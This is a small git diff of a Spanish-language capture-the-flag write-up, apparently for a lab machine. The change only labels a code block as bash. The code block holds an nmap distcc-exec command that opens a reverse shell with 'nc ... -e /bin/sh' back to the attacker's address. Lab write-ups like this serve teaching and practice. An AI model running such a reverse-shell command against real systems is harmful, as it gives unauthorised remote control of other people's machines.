@@ -110,7 +110,7 @@ Buscamos en Google "distccc exploit" y observamos que aparece en **hacktricks**.
 
 Probamos con nmap como nos indica el articulo. En el comando ponemos la shell inversa.
 
-```
+```bash
 nmap -p3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc 10.10.14.31 443 -e /bin/sh'"
 ```
 
